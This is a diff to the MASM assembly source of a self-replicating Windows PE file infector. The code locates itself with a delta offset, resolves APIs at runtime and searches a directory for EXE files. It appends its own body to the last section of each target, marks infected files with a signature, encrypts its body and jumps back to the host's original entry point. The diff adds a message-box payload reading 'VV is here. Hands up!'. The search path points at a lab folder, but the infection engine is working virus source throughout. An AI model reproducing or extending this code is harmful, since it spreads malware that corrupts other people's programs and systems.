@@ -2,7 +2,7 @@
 .model flat, stdcall
 option casemap:none
 
-include \masm32\include\windows.inc;comment
+include \masm32\include\windows.inc
 include \masm32\include\user32.inc
 include \masm32\include\kernel32.inc
 
@@ -11,12 +11,16 @@ includelib \masm32\lib\kernel32.lib
 
 .code
 
+;TODO multiple asm files
+
 LABEL_START:
+	;get delta offset
 	call LABEL_DELTA
 LABEL_DELTA:
 	pop edi
 	sub edi,offset LABEL_DELTA;delta offset in edi
 	jmp LABEL_MAIN
+
 ;-----------------------------------------------------------
 ;in-WINAPI 
 ;	address,size,key address,key size
@@ -65,127 +69,6 @@ Crypt proc
 
 	ret
 Crypt endp
-
-;----------------------------------------------------------------------------------------
-;calling convention:WINAPI                                                                 
-;in                                                                                        
-;	file handle 8,message_address C,message_size 10,key 14,key_size 18
-;----------------------------------------------------------------------------------------
-;TODO in must be filepath?
-;TODO FileCrypt must be inside crypto_markers to encrypt it
-FileCrypt proc
-	push ebp
-	mov ebp,esp
-	pushad
-	pushfd
-
-	mov eax,dword ptr [ebp+18h];key size
-	add eax,4;NumberOfBytesRead
-	push eax
-	mov eax,LPTR	;TODO - push LPTR?
-	push eax
-	call [edi+_LocalAlloc]
-	push eax;mem ptr in stack
-
-	mov eax,dword ptr[ebp+10h]	;buffer_size
-	mov ebx,dword ptr[ebp+18h]	;key size
-	mov edx,0
-	div ebx; eax - (keysizeblocks_amount-1); edx - additional_bytes_amount
-	mov ecx,eax
-	inc ecx;full amount of blocks (all full and 1 not full)
-	
-	mov eax, dword ptr[ebp+0Ch];message address
-
-	push ecx
-	push edx
-
-	push FILE_BEGIN
-	push NULL	;TODO its no always NULL
-	push eax
-	mov eax,dword ptr [ebp+8];file handle
-	push eax
-	call [edi+_SetFilePointer];file pointer on message address ; file position in eax
-
-	pop edx
-	pop ecx
-
-	;ecx - full amount of blocks
-	LABEL_FileCrypt_cryptLoopBegin:
-	cmp ecx,0						;TODO optimize?
-	jz LABEL_FileCrypt_cryptLoopEnd
-	cmp ecx,1						;TODO optimize?
-	jnz LABEL_FileCrypt_NotLastBlock
-	mov ebx,edx;size
-	LABEL_FileCrypt_NotLastBlock:
-	push ecx
-	push edx;amount of bytes of not full block in stack
-	push eax;message pointer in stack
-
-	mov eax, dword ptr [esp+0Ch];mem ptr
-	add eax,ebx;key size
-	push NULL
-	push eax
-	sub eax, ebx
-	push ebx
-	push eax
-	mov eax,dword ptr [ebp+8];file handle
-	push eax
-	call [edi+_ReadFile];block of key size in memory
-
-	mov eax,dword ptr[esp];message pointer
-
-	push FILE_BEGIN
-	push NULL
-	push eax
-	mov eax,dword ptr [ebp+8];file handle
-	push eax
-	call [edi+_SetFilePointer];file pointer returned; position in file in eax
-
-	push ebx;CURRENT key size
-	mov eax,dword ptr [ebp+14h];key addr
-	push eax
-	push ebx;CURRENT key size
-	mov eax,dword ptr [esp+18h];mem ptr
-	push eax
-	call Crypt
-	;now in memory crypted block
-
-	mov eax,dword ptr[esp+0Ch];mem ptr
-	add eax,ebx
-	push NULL
-	push eax
-	sub eax, ebx
-	push ebx
-	push eax
-	mov eax,dword ptr [ebp+8];file handle
-	push eax
-	call [edi+_WriteFile];writing crypted in file
-
-	pop eax;message pointer in eax
-	add eax,ebx
-	pop edx
-	pop ecx
-	dec ecx
-
-	jmp LABEL_FileCrypt_cryptLoopBegin
-	LABEL_FileCrypt_cryptLoopEnd:
-
-	call [edi+_LocalFree]
-
-	popfd
-	popad
-
-	mov esp,ebp
-	pop ebp
-
-	push eax;stack clining
-	mov eax,dword ptr [esp+4];ret address
-	mov dword ptr [esp+18h],eax
-	pop eax
-	add esp,14h;esp on ret address
-
-	ret
-FileCrypt endp
 
 ;----------------------------------------------------------------------------------------
 LABEL_MAIN:
@@ -298,6 +181,14 @@ LABEL_MAIN_cryptoBodyBegin:
 	call esi
 	mov dword ptr [edi+offset _GetLastError],eax
 
+	mov ebx,offset MessageBoxA_
+	add ebx, edi
+	push ebx
+	mov ebx,dword ptr [esp+4]
+	push ebx
+	call esi
+	mov dword ptr [edi+offset _MessageBoxA],eax
+	
 	;Search and infect other victims
 	;TODO - SearchEXE should only search, not infect
 	pop esi
@@ -305,7 +196,8 @@ LABEL_MAIN_cryptoBodyBegin:
 	add esi,offset path
 	call SearchEXE
 
-	;TODO - Payload?
+	;TODO execute Payload
+	;call Payload
 
 	;Redirect execution to original entry point
 	mov eax, offset LABEL_START
@@ -319,6 +211,8 @@ LABEL_MAIN_cryptoBodyBegin:
 	jmp eax
 
 ;----------------------------------------------------------------------------------------
+;Description
+;	Performs infection
 ;in
 ;	esi: exe ASCIIZ path
 ;----------------------------------------------------------------------------------------
@@ -633,7 +527,6 @@ Infect proc
 	push eax
 	call [edi+ offset _WriteFile];writing characteristics
 	;***************Characteristics**************************
-
 	;Inject body in target
 	;Inject right to the end
 	push FILE_END
@@ -867,8 +760,6 @@ Infect proc
 	;************************File Alignment*************************
 
 	;************************Section Alignment**********************
-	int 3h
-
 	push FILE_BEGIN
 	push NULL
 	mov eax,dword ptr [esp+8];last section offset
@@ -1036,8 +927,131 @@ Infect proc
 	ret
 Infect endp
 
+;----------------------------------------------------------------------------------------
+;calling convention:WINAPI                                                                 
+;in                                                                                        
+;	file handle 8,message_address C,message_size 10,key 14,key_size 18
+;----------------------------------------------------------------------------------------
+;TODO in must be filepath?
+;TODO FileCrypt must be inside crypto_markers to encrypt it
+FileCrypt proc
+	push ebp
+	mov ebp,esp
+	pushad
+	pushfd
+
+	mov eax,dword ptr [ebp+18h];key size
+	add eax,4;NumberOfBytesRead
+	push eax
+	mov eax,LPTR	;TODO - push LPTR?
+	push eax
+	call [edi+_LocalAlloc]
+	push eax;mem ptr in stack
+
+	mov eax,dword ptr[ebp+10h]	;buffer_size
+	mov ebx,dword ptr[ebp+18h]	;key size
+	mov edx,0
+	div ebx; eax - (keysizeblocks_amount-1); edx - additional_bytes_amount
+	mov ecx,eax
+	inc ecx;full amount of blocks (all full and 1 not full)
+	
+	mov eax, dword ptr[ebp+0Ch];message address
+
+	push ecx
+	push edx
+
+	push FILE_BEGIN
+	push NULL	;TODO its no always NULL
+	push eax
+	mov eax,dword ptr [ebp+8];file handle
+	push eax
+	call [edi+_SetFilePointer];file pointer on message address ; file position in eax
+
+	pop edx
+	pop ecx
+
+	;ecx - full amount of blocks
+	LABEL_FileCrypt_cryptLoopBegin:
+	cmp ecx,0						;TODO optimize?
+	jz LABEL_FileCrypt_cryptLoopEnd
+	cmp ecx,1						;TODO optimize?
+	jnz LABEL_FileCrypt_NotLastBlock
+	mov ebx,edx;size
+	LABEL_FileCrypt_NotLastBlock:
+	push ecx
+	push edx;amount of bytes of not full block in stack
+	push eax;message pointer in stack
+
+	mov eax, dword ptr [esp+0Ch];mem ptr
+	add eax,ebx;key size
+	push NULL
+	push eax
+	sub eax, ebx
+	push ebx
+	push eax
+	mov eax,dword ptr [ebp+8];file handle
+	push eax
+	call [edi+_ReadFile];block of key size in memory
+
+	mov eax,dword ptr[esp];message pointer
+
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [ebp+8];file handle
+	push eax
+	call [edi+_SetFilePointer];file pointer returned; position in file in eax
+
+	push ebx;CURRENT key size
+	mov eax,dword ptr [ebp+14h];key addr
+	push eax
+	push ebx;CURRENT key size
+	mov eax,dword ptr [esp+18h];mem ptr
+	push eax
+	call Crypt
+	;now in memory crypted block
+
+	mov eax,dword ptr[esp+0Ch];mem ptr
+	add eax,ebx
+	push NULL
+	push eax
+	sub eax, ebx
+	push ebx
+	push eax
+	mov eax,dword ptr [ebp+8];file handle
+	push eax
+	call [edi+_WriteFile];writing crypted in file
+
+	pop eax;message pointer in eax
+	add eax,ebx
+	pop edx
+	pop ecx
+	dec ecx
+
+	jmp LABEL_FileCrypt_cryptLoopBegin
+	LABEL_FileCrypt_cryptLoopEnd:
+
+	call [edi+_LocalFree]
+
+	popfd
+	popad
+
+	mov esp,ebp
+	pop ebp
+
+	push eax;stack clining
+	mov eax,dword ptr [esp+4];ret address
+	mov dword ptr [esp+18h],eax
+	pop eax
+	add esp,14h;esp on ret address
+
+	ret
+FileCrypt endp
+
 ;+
 ;----------------------------------------------------------------------------------------
+;Description
+;Compares 2 ASCIIZ-strings
 ;in
 ;	esi-pointer to 1st asciiz str
 ;	edx-pointer to 2nd asciiz str ;TODO - why edx and not edi
@@ -1203,7 +1217,10 @@ GetGetProcAddress proc
 	ret
 GetGetProcAddress endp
 
+;+
 ;---------------------------------------------------------------------------------------
+;Description
+;	Checks if target file infected
 ;in
 ;	esi-asciiz path address 
 ;out
@@ -1211,6 +1228,8 @@ GetGetProcAddress endp
 ;---------------------------------------------------------------------------------------
 IsInfected proc
 	pushfd
+
+	;Open target file
 	push NULL
 	push FILE_ATTRIBUTE_NORMAL
 	push OPEN_EXISTING
@@ -1221,7 +1240,7 @@ IsInfected proc
 	call [edi+offset _CreateFileA]
 
 	cmp eax, INVALID_HANDLE_VALUE
-	jz error
+	jz LABEL_IsInfected_onError
 
 	push eax;file handle in stack
 
@@ -1237,6 +1256,7 @@ IsInfected proc
 
 	push eax;pointer to memory in stack
 
+	;Read PE sign offset
 	push NULL
 	add eax,4
 	push eax
@@ -1284,20 +1304,20 @@ IsInfected proc
 	pop eax
 
 	cmp eax,0ABCDDCBAh	;TODO place signature value in var
-	jz inf_label
+	jz LABEL_IsInfected_Infected
 
-	add esp,8
+	add esp,8 ;TODO Rewrite this multi-return block 
 	popfd
 	mov eax,0
 	ret
 
-	inf_label:
+	LABEL_IsInfected_Infected:
 	add esp,8
 	popfd
 	mov eax,1
 	ret
 
-	error:
+	LABEL_IsInfected_onError:
 	mov eax,2
 	popfd
 	ret
@@ -1586,11 +1606,14 @@ SearchEXE proc
 	ret
 SearchEXE endp
 
+;+
 ;------------------------------------------------------------------------------------
+;Description
+;	Gets index of last section in file and checks if it has largest VirtualAddress 
 ;in: 
 ;	esi: path to exe
 ;out:
-;	eax:number of last section in section table ;-1 - exe isnlt infectable
+;	eax:number of last section in section table ;-1 - PE not infectable
 ;------------------------------------------------------------------------------------
 Incubation proc
 	pushfd
@@ -1598,6 +1621,7 @@ Incubation proc
 	push ecx
 	push edx
 
+	;Open target file
 	push NULL
 	push FILE_ATTRIBUTE_NORMAL
 	push OPEN_EXISTING
@@ -1611,12 +1635,14 @@ Incubation proc
 	push esi
 	call [edi+ offset _CreateFileA]
 
+	;Check if target PE file readable/writable
+	;If no -> return "PE not infectable"
 	cmp eax, INVALID_HANDLE_VALUE
-	jnz file_opened
+	jnz LABEL_Incubation_fileOpened
 	mov eax,-1
 	jmp exit
-	file_opened:
-	
+
+	LABEL_Incubation_fileOpened:
 	push eax;file handle in stack
 	
 	mov eax,8
@@ -1626,14 +1652,14 @@ Incubation proc
 
 	push eax;memory pointer in stack 
 	
-	mov eax,dword ptr [esp+4]
+	mov eax,dword ptr [esp+4];hFile
 	push FILE_BEGIN
 	push NULL
 	push 3Ch
 	push eax
 	call [edi+ offset _SetFilePointer];file pointer on e_lfanew
 	
-	mov eax,dword ptr [esp]
+	mov eax,dword ptr [esp] ;mem_ptr
 	push NULL
 	add eax,4
 	push eax
@@ -1651,14 +1677,14 @@ Incubation proc
 	
 	add ebx,6;offset of NumberOfSections field in ebx
 	
-	mov eax,dword ptr [esp+8]
+	mov eax,dword ptr [esp+8];hFile
 	push FILE_BEGIN
 	push NULL
 	push ebx
 	push eax
 	call [edi+ offset _SetFilePointer];file pointer on NumberOfSections
 	
-	mov eax,dword ptr [esp+4]
+	mov eax,dword ptr [esp+4];mem_ptr
 	push NULL
 	add eax,4
 	push eax
@@ -1669,9 +1695,9 @@ Incubation proc
 	push eax
 	call [edi+ offset _ReadFile];NumberOfSections in memory
 	
-	mov ebx,dword ptr [esp]
+	mov ebx,dword ptr [esp];offset_PE_Sign
 	add ebx,14h; SizeOfOptionalHeader
-	mov eax,dword ptr [esp+8]
+	mov eax,dword ptr [esp+8];hFile
 	push FILE_BEGIN
 	push NULL
 	push ebx
@@ -1689,9 +1715,7 @@ Incubation proc
 	push eax
 	call [edi+ offset _ReadFile];SizeOfOptionalHeader in memory
 	
-	
-	
-	mov eax,dword ptr [esp+4]
+	mov eax,dword ptr [esp+4];mem_ptr
 	xor ecx,ecx
 	mov cx,word ptr [eax];now in ecx NumberOfSections
 	xor ebx,ebx
@@ -1699,11 +1723,11 @@ Incubation proc
 	
 	pop eax;PE signature offset 
 	add eax,ebx;+PE optional header
-	add eax,18h;offset of 1st section field in eax
+	add eax,18h;offset of 1st section field in eax (sizeof(PE_singature)+sizeof(IMAGE_PE_HEADER))
 	
 	push eax;offset of 1st section field in stack
 	
-	add eax, 14h;PointerToRawData
+	add eax, 14h;to _IMAGE_SECTION_HEADER.PointerToRawData
 	
 	push ecx; NumberOfSections in stack
 
@@ -1717,12 +1741,12 @@ Incubation proc
 	;now in eax offset of last section
 	;	sub eax,28h;offset of last section in eax
 
-	mov ebx,0
+	mov ebx,0 ;max PointerToRawData here
 	mov edx,-1
+	;for every section
 	loop_label1:
 	cmp ecx,0
 	jz end_loop_label1
-	
 	
 	push eax;current file pointer
 	push ecx; counter
@@ -1735,7 +1759,6 @@ Incubation proc
 	mov eax,dword ptr [esp+28h]
 	push eax
 	call [edi+ offset _SetFilePointer];file pointer on PointerToRawData
-	
 	
 	mov eax,dword ptr [esp+18h];memory ptr
 	push NULL
@@ -1752,13 +1775,13 @@ Incubation proc
 	mov ebx,dword ptr [eax];PointerToRawData
 	mov eax,dword ptr [esp+4];max PointerToRawData
 	cmp eax,ebx
-	jg rawptr_nl
-	
+	jg rawptr_nl;TODO ja jb ?
+	;Set new last section info
 	mov dword ptr [esp+4],ebx;new max PointerToRawData
 	
 	mov eax,dword ptr [esp+10h];NumberOfSections
 	mov ebx,dword ptr [esp+8];counter
-	sub eax,ebx
+	sub eax,ebx;TODO lol nice logic here 
 	mov dword ptr [esp],eax;new number of section with max PointerToRawData
 	rawptr_nl:
 	pop edx
@@ -1766,13 +1789,13 @@ Incubation proc
 	pop ecx
 	dec ecx
 	pop eax
-	add eax,28h
+	add eax,28h;sizeof(IMAGE_SECTION_HEADER)
 	jmp loop_label1
 	end_loop_label1:
-		;now in ebx - max PointerToRawData; in edx - number of section with max PointerToRawData(last section in file)
+		;now in ebx - max PointerToRawData; in edx - index of section with max PointerToRawData(last section in file)
 
-	mov eax,dword ptr [esp+4];offset of 1st section field in stack
-	mov ecx,edx
+	mov eax,dword ptr [esp+4];offset of 1st section field
+	mov ecx,edx;index of last section in file
 	loop_label3:
 	cmp ecx,0
 	jz end_loop_label3
@@ -1780,11 +1803,15 @@ Incubation proc
 	dec ecx
 	jmp loop_label3
 	end_loop_label3:
-	;now in eax offset of last section in file field
+	;now in eax offset of last section field in file field
 
-	push edx;number of section with max PointerToRawData(last section in file) in stack
+	push edx;index of section with max PointerToRawData(last section in file) in stack
 	
-	add eax,0Ch;VirtualAddress
+	;Check if last section on disk has largest VirtualAddress
+	;TODO Even if last section doesnt have largest VirtualAddress value then if theres enough space in memory memory section size can be extended and body can be placed there 
+	;Or body can be placed in unused space in memory, such cases arent very rare
+
+	add eax,0Ch;to _IMAGE_SECTION_HEADER.VirtualAddress
 	push FILE_BEGIN
 	push NULL
 	push eax
@@ -1792,8 +1819,7 @@ Incubation proc
 	push eax
 	call [edi+ offset _SetFilePointer];file ptr on VirtualAddress of field of last section in file
 	
-	
-	mov eax, dword ptr[esp+0Ch]
+	mov eax, dword ptr[esp+0Ch];mem_ptr
 	push NULL
 	add eax,4
 	push eax
@@ -1813,11 +1839,11 @@ Incubation proc
 	add eax, 0Ch;VirtualAddress
 	mov ecx, dword ptr [esp+8h];NumberOfSections
 	loop_label2:
-	cmp ecx,0
+	cmp ecx,0 ; TODO cmp ecx, 0FFFFFFFFh ?
 	jz end_loop_label2
 	
-	push eax
-	push ecx
+	push eax ;VirtualAddress offset
+	push ecx;NumberOfSections counter
 	
 	push FILE_BEGIN
 	push NULL
@@ -1875,6 +1901,35 @@ Incubation proc
 	ret
 Incubation endp
 
+;------------------------------------------------------------------------------------
+;Description
+;	Does payload functionality
+;------------------------------------------------------------------------------------
+lpText db 'VV is here. Hands up!',0
+lpCaption db 'VV',0
+
+Payload proc
+	push ebp
+	mov ebp,esp
+	pushad
+	pushfd
+
+	push 0 					;uType; MB_OK==0
+	lea eax, lpCaption
+	push eax				;lpCaption
+	lea eax, lpText
+	push eax				;lpText
+	push NULL 				;hWnd
+	call [edi+ offset _MessageBoxA] ;MessageBox function in user32.dll
+	
+	popfd
+	popad
+	mov esp,ebp
+	pop ebp
+	ret
+Payload endp
+
+
 some_var dd 0
 _GetProcAddress dd 0
 _CreateFileA dd 0
@@ -1888,6 +1943,9 @@ _FindFirstFileA dd 0
 _FindNextFileA dd 0
 _GetLastError dd 0
 
+;for payload
+_MessageBoxA dd 0
+
 GetProcAddress_ db 'GetProcAddress',0;15
 CreateFileA_ db 'CreateFileA',0;12
 ReadFile_ db 'ReadFile',0;9
@@ -1899,6 +1957,7 @@ LocalFree_ db 'LocalFree',0;10
 FindFirstFileA_ db 'FindFirstFileA',0;15
 FindNextFileA_ db 'FindNextFileA',0;14
 GetLastError_ db 'GetLastError',0;13
+MessageBoxA_ db 'MessageBoxA',0;13
 ;можно хранить не сами названия, а хеш-коды от названий
 ;например GetProcAddress dd 3FE589ADh
 ;вместо     GetProcAddress db 'GetProcAddress',0
@@ -1914,16 +1973,12 @@ GetLastError_ db 'GetLastError',0;13
 ;как только находим такой же хеш в таблице экспорта - запоминаем адрес в нашем массиве адресов функций с таким же индексом
 ;все это делать придется вручную, а не через GetProcAddress, т.к. имен не будет
 
-
-
 victim dd 1
 victim_count dd 1
 entry_point dd 1000h
 my_entry_point dd 1000h
 rva_code dd 1000h
-path db 'C:\laboratory',0
-
-
+path db 'C:\laboratory'	,0
 
 ending_crypto:
 cryptmarker_end BYTE 0DEh,0ADh,0BEh,0EFh,0FEh,0EDh,0FAh,0CEh
